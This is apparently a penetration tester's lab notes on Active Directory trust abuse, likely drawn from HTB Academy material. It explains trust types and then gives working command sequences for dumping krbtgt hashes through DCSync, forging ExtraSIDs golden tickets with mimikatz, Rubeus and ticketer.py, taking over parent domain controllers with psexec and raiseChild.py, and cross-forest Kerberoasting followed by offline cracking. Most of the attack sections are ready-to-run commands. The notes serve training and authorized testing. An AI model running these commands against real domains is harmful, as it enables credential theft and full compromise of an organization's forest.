---
title: AD Domain Trust Abuse
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - exploitation
---
 
Trust: allows users to access resources (or preform administrative tasks) in another domain.
An organization can create various types of trusts: 
- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.

2 types of trust:
- A `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.

Trusts can be set up in two directions: one-way or two-way (bidirectional).
- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.

---
# Trust Enumeration

- Enumerate trust relationships for the current domain using LOTL: 
```powershell
PSH:
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

CMD:
C:\> netdom query /domain:DOMAIN_FQDN trust # Enumerate domain trust
C:\> netdom query /domain:DOMAIN_FQDN dc # enumerate domain controllers
C:\> netdom query /domain:DOMAIN_FQDN workstation # enumerate workstations and servers

nltest /domain_trusts
```

- Enumerate using PowerView (**recommended**):
```powershell
PS C:\> Import-Module PowerView.ps1
PS C:\> Get-DomainTrust 
PS C:\> Get-DomainTrustMapping
```

> [!Note]
> Check the `ForestTransitive` property. If its set to true, it means that it is a forest trust or external trust, so maybe we can leverage it to access a different domain and gain domain admin privileges to the current domain.

- Enumerating trust domain DC:
```
nslookup -type=SRV _ldap._tcp.DOMAIN_FQDN

or

nslookup -type=SRV _kerberos._tcp.zsm.local
```

- Enumerate a different domain we have trust on:
```powershell
PS C:\htb> Get-DomainUser -Domain TRUSTED_DOMAIN_FQDN | select SamAccountName
```

- Enumerating trusts using BloodHound:
```
1. Use the prebuilt query "Map Domain Trusts"
```

---
# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

> [!info]
> **sidHistory** 
> 
> Attribute used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. 

**ExtraSIDs Attack**
This attack allows for the compromise of a parent domain once the child domain has been compromised.

Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection (filter auth requests between domains in different forests that have trust). Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

> [!Requirements]
> Full control over the child domain and:
> 
> - The KRBTGT hash for the child domain
> - The SID for the child domain
> - The name of a target user in the child domain (does not need to exist!)
> - The FQDN of the child domain.
> - The SID of the Enterprise Admins group of the root domain.

1. Login as a domain admin in the compromised child domain.
2. Obtaining the krbtgt account NTLM hash in the **child domain**:
```powershell
PS C:\>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt (logistics is the CN of the compromised child domain -> LOGISTICS.INLANEFREIGHT.LOCAL)
```

3. Get **child domain** SID:
```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> Get-DomainSID
```

4. Obtain the SID for the `Enterprise Admins` group in the **parent domain**:
```powershell
PS C:\> Get-DomainGroup -Domain PARENT_DOMAIN_FQDN -Identity "Enterprise Admins" | select distinguishedname,objectsid

or

PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server "PARENT_DOMAIN_FQDN"
```

5. Confirm we dont have access to the filesystem of the DC in the parent domain:
```powershell
PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
```

6. Create a Golden Ticket:
```powershell
+ USING MIMIKATZ +
PS C:\> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:CHILD_DOMAIN_FQDN /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_NTLM_HASH /sids:ENTERPRISE_ADMIN_GROUP_SID /ptt

+ USING RUBEUS +
PS C:\>  .\Rubeus.exe golden /rc4:CHILD_KRBTGT_NTLM_HASH /domain:CHILD_DOMAIN_FQDN /sid:CHILD_DOMAIN_SID  /sids:ENTERPRISE_ADMIN_GROUP_SID /user:hacker /ptt

+ CHECK +
PS C:\> klist # check the kerberos golden ticket is in memory
```

> [!Note]
> - The user can be completely invented. In this case we used a user called `hacker`
> - The /sids flag will tell mimikatz/rubeus to create a golden ticket giving us the same rights as the `Enterprise Admins` group in the parent domain

7. From now on, we can access any resources in the parent domain:
```powershell
PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$ # list the file system
```

8. Perform a DCSync attack agains the **parent domain** (targeting the `lab_adm` account -> Domain Admin user)
```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

> [!Note]
> If we are dealing with multiple domains and the target domain is not the same as the users, we have to specify the domain we are targeting the DCSync attack:
> 
> `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

---
# Attacking Domain Trusts - Child -> Parent Trusts - from Linux
> [!Requirements]
> Full control over the child domain and:
> 
> - The KRBTGT hash for the child domain
> - The SID for the child domain
> - The name of a target user in the child domain (does not need to exist!)
> - The FQDN of the child domain
> - The SID of the Enterprise Admins group of the root domain

1. DCSync and grab the NTLM hash for the KRBTGT account in the **child domain**:
```shell
$ secretsdump.py CHILD_DOMAIN_FQDN/CHILD_DOMAIN_ADMIN_USER@CHILD_DC_IP -just-dc-user LOGISTICS/krbtgt
```

2. Perform SID brute forcing to find the SID of the **child domain**:
```shell
$ lookupsid.py CHILD_DOMAIN_FQDN/CHILD_DOMAIN_ADMIN_USER@CHILD_DOMAIN_DC_IP 

Filter the output:
$ lookupsid.py CHILD_DOMAIN_FQDN/CHILD_DOMAIN_ADMIN_USER@CHILD_DC_IP | grep "Domain SID"
```

> [!Note]
> The output will give us the Domain `SID` and the `RIDs` for each user and group that could be used to create the SID in the format `SID-RID`

3. Perform SID brute forcing to find the SID of the `Enterprise Admins` group in the **parent domain**:
```shell
$ lookupsid.py CHILD_DOMAIN_FQDN/CHILD_DOMAIN_ADMIN_USER@PARENT_DC_IP | grep -B12 "Enterprise Admins"
```

> [!Important]
> The output will show us the SID of the parent domain and the RID of the `Enterprise Admins` group. The SID of the `Enterprise Admins` group is `SID-RID`.

4. Create the Golden Ticket:
```shell
$ ticketer.py -nthash KRBTGT_NTLM_HASH -domain CHILD_DOMAIN_FQDN -domain-sid CHILD_DOMAIN_SID -extra-sid ENTERPRISE_ADMIN_GROUP_SID hacker
```

> [!Note]
> The Golden Ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`)

5. Reference the ccache file for kerberos authentication attempts:
```shell
$ export KRB5CCNAME=hacker.ccache 
```

> [!Note]
> The ticket will be saved into a credentials cache file (ccache) which is used to hold kerberos credentials. Setting the env variable will tells the system to use these credentials for auth.

6. Access the parent domain DC:
```shell
$ psexec.py CHILD_DOMAIN_FQDN/hacker@PARENT_DC_FQDN -k -no-pass -target-ip PARENT_DC_IP
```

**Automating the process**
- Using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py):
```shell
$ raiseChild.py -target-exec PARENT_DC_IP CHILD_DOMAIN_FQDN/CHILD_DOMAIN_ADMIN_USER
```

> [!Note]
> This tool will automate all the process and return the credentials for the Administrator account in the parent domain. 
> 
> If the flag `target-exec` is set, it will authenticate to the parent DC using PSexec

---
# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

**Cross-Forest Kerberoasting**

Perform kerberoasting/ASREProasting on a user that belongs to a different domain in a different forest but has Domain Admin rights.

> [!Requirements]
> You are positioned in a domain with either an inbound or bidirectional domain/forest trust.
> Its **not** necessary to have domain admin privileges on the current domain.

1. Enumerate users in a target domain (different forest) that have SPN associated with them:
```powershell
PS C:\> Get-DomainUser -SPN -Domain TARGET_DOMAIN_FQDN | select SamAccountName
```

2. Enumerate if the target users have domain admin rights:
```powershell
PS C:\htb> Get-DomainUser -Domain TARGET_DOMAIN_FQDN -Identity TARGET_USER |select samaccountname,memberof
```

3. Perform the kerberoasting attack:
```powershell
PS C:\> .\Rubeus.exe kerberoast /domain:TARGET_DOMAIN_FQDN /user:TARGET_USER /nowrap
```

4. Crack the hash offline and if we are successful we will gain domain admin privileges over the current domain by leveraging a different domain.

**Admin Password Re-Use & Foreign Group Membership**

1. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests.

2. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

Enumerate groups with users that do not belong to the domain (foreign group membership):
```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain TARGET_DOMAIN_FQDN
*copy the MemberName SID*

PS C:\htb> Convert-SidToName USER_SID
```

> [!Note]
> Use this command with domains in different forests than ours and which we have trust with obviously.

If we have a user from our current domain that belongs to a group from a different domain in a different forest we have trust (for example the Administrators group), we can access the DC from the target domain:
```powershell
PS C:\htb> Enter-PSSession -ComputerName TARGET_DC_FQDN -Credential CURRENT_DOMAIN_NAME\ADMIN_USER
```

**SID History Abuse - Cross Forest**

If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.

---
# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

**Cross-Forest Kerberoasting**

> [!Requirements]
> Credentials for a user that can authenticate into the target domain

- Enumerate users in the target domain that have SPN associated with them:
```shell
$ GetUserSPNs.py -target-domain TARGET_DOMAIN_FQDN CURRENT_DOMAIN_FQDN/USER

For example:
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```

- Obtain the TGS ticket:
```shell
$ GetUserSPNs.py -request -target-domain TARGET_DOMAIN_FQDN CURRENT_DOMAIN_FQDN/USER

Parameters:
-request: request the TGS ticket
-outputfile <OUTPUT FILE>: outputs the hash into a file for cracking
```

- Perform offline cracking of the hash using hashcat with mode `13100`

> [!Note]
> With the obtained credentials, apart from authenticating to the target domain, we could also check if a similar user exists in our current domain and its being reused. Also, we could perform a password spray attack just in case.
> 

**Foreign Group Membership**

Identify groups in a target domain that contain users from our current domain.

1. Modify the resolv.conf file to add the **current domain** info:
```shell
$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain CURRENT_DOMAIN_FQDN
nameserver CURRENT_DC_IP
```

> [!Note]
> We do this because the python implementation of BloodHound uses the DNS hostname for the target DC instead of an IP. We are just trying to run BloodHound on the current domain and after on the target domain

2. Run BloodHound to gather data for the **current domain**:
```shell
$ bloodhound-python -d CURRENT_DOMAIN_FQDN -dc CURRENT_DC_HOSTNAME -c All -u CURRENT_DOMAIN_USER -p PASSWORD
```

3. Compress the Zip files:
```shell
zip -r data.zip *.json
```

4. Modify the resolv.conf file to add the **target domain** info:
```shell
$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain TARGET_DOMAIN_FQDN
nameserver TARGET_DC_IP
```

5. Run BloodHound to gather data for the **target domain**:
```shell
$ bloodhound-python -d TARGET_DOMAIN_FQDN -dc TARGET_DC_FQDN -c All -u CURRENT_DOMAIN_USER@CURRENT_DOMAIN_FQDN -p PASSWORD
```

6. Compress the Zip files:
```shell
zip -r data2.zip *.json
```

7. Upload the zip files to BloodHound
8. Run the query `Users with Foreign Domain Group Membership` and select the **current domain** as the source domain